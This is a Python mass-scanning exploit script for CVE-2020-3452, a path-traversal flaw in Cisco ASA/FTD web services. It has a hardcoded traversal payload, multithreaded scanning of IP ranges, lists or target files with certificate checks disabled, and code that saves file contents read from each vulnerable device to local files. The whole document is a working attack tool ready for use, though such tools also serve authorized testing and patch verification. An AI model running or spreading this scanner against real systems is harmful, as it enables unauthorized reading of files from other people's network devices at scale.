import sys
import argparse
import time
from concurrent.futures import ThreadPoolExecutor
import requests
import urllib3
import colorama
from netaddr.ip import IPRange

colorama.init(strip=False)

def banner():
    '''banner() - prints the banner of current utility'''
    print('{}'.format(colorama.Fore.YELLOW))
    print("  __ _  _ ___     ___  __  ___  __     ___  __  ___  ___ ")
    print(" / _| )( |  _)___(__ \/  \(__ \/  \ __(__ )/ ,)/ __)(__ \\")
    print("( (_ \\\// ) _|___) __( () ) __( () |___|_ (_  _)__ \/ __/")
    print(" \__)(__)(___)   \___)\__/\___)\__/   (___/ (_)(___/\___)")
    print('{}\n                     by paran0id'.format(colorama.Fore.BLUE))
    print("----------------------------------------------------------")
    print('{}'.format(colorama.Fore.WHITE))

def check_vuln(target):
    '''check_vuln(target) - check target for cve-2020-3452'''
    try:
        url = None
        if args.https:
            url = 'https://'+target+POC
        else:
            url = 'http://'+target+POC
        res = send_request(url)
        if res.status_code == 200:
            print('{}[!]{} is vulnerable ({})'.format(colorama.Fore.RED, target, url))
            f_name = str(target)+'_'+url.split(':')[0]+'.txt'
            save_in_file(f_name, res.text, target)
        else:
            print('{}[+]{} is not vulnerable ({})'.format(colorama.Fore.GREEN, target, url))
        time.sleep(5)
    except:
        print('{}Unable to check vuln for {}.{} Reason: {}'.format(
            colorama.Fore.RED, target, colorama.Fore.WHITE, sys.exc_info()[0]))

def scan_range(ip_start, ip_finish):
    '''scan_range(ip_start, ip_finish) - function for multithread scanning
       the ip-range for cve-2020-3452'''
    ip_list = []
    for ip in IPRange(ip_start, ip_finish):
        ip_list.append(str(ip))
    try:
        ex = ThreadPoolExecutor(max_workers=int(args.threads))
        ex.map(check_vuln, ip_list)
        ex.shutdown(wait=True)
    except:
        print('{}Error: Problems with threads.{} Reason: {}'.format(
            colorama.Fore.RED, colorama.Fore.WHITE, sys.exc_info()[0]))

def scan_list(ip_list):
    '''scan_list(ip_list) - function for multithread scanning
       the ip-list for cve-2020-3452'''
    try:
        ex = ThreadPoolExecutor(max_workers=int(args.threads))
        ex.map(check_vuln, ip_list)
        ex.shutdown(wait=True)
    except:
        print('{}Error: Problems with threads.{} Reason: {}'.format(
            colorama.Fore.RED, colorama.Fore.WHITE, sys.exc_info()[0]))

def get_targets_from_file(filename):
    '''
    get_targets_from_file - getting targets from file
    '''
    ip_list = []
    try:
        file = open(filename, 'r')
        for line in file:
            ip_list.append(line)
        file.close()
        return ip_list
    except:
        print('{}Error: Unable to open the file with targets.{} Reason: {}'.format(
            colorama.Fore.RED, colorama.Fore.WHITE, sys.exc_info()[0]))

def send_request(url):
    '''send_request(url) - for sending request to target'''
    try:
        if url:
            res = requests.get(url, verify=False, timeout=10)
            return res
    except:
        print('{}Error: Unable to send request.{} Reason: {}'.format(
            colorama.Fore.RED, colorama.Fore.WHITE, sys.exc_info()[0]))

def save_in_file(filename, text, target):
    '''save_in_file(filename, text, target) - function to save response from target to file.
       Name of file is <target_http/https.txt>. The file is located in the same
       folder as cve_2020_3452.py (this script)
    '''
    try:
        file = open(filename, 'w')
        file.write(text)
        file.close()
        print('{}Response from {} saved in {}'.format(colorama.Fore.WHITE, target, filename))
    except:
        print('{}Error: Output for this host couldn\'t be saved.{} Reason: {}'.format(
            colorama.Fore.RED, colorama.Fore.WHITE, sys.exc_info()[0]))


if __name__ == '__main__':
    POC = '/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../'
    banner()
    urllib3.disable_warnings()

    parser = argparse.ArgumentParser()
    parser.add_argument(
        "-i", "--ip", help="URL to request, ex: 192.168.1.1 or asa.example.com",
        metavar="<ip>", required=False, dest="target"
    )
    parser.add_argument(
        "-r", "--range", help="IP-range, ex: 192.168.1.1-192.168.1.100",  
        metavar="<ip-start>-<ip-end>", required=False, dest="ip_range"
    )
    parser.add_argument(
        "-l", "--list", help="List of IP-addresses, ex: 192.168.1.1,192.168.1.2,192.168.1.3",
        metavar="<ip1>,<ip2>,...,<ipn>", required=False, dest="ip_list"
    )
    parser.add_argument(
        "-f", "--from-file", help="Upload targets from file, ex: /root/targets.txt",
        metavar="<file_path>", required=False, dest="trg_file"
    )
    parser.add_argument(
        "-t", "--threads", help="Number of threads, ex: 10",
        metavar="<10>", required=False, default=10, dest="threads", type=int
    )
    parser.add_argument(
        "--https", help="Scan only https", action="store_true"
    )
    args = parser.parse_args()
    if args.target:
        check_vuln(args.target)
    if args.ip_range:
        ip_range = args.ip_range.split("-")
        scan_range(ip_range[0], ip_range[1])
    if args.ip_list:
        ip_list = args.ip_list.split(",")
        scan_list(ip_list)
    if args.trg_file:
        ip_list = get_targets_from_file(args.trg_file)
        scan_list(ip_list)
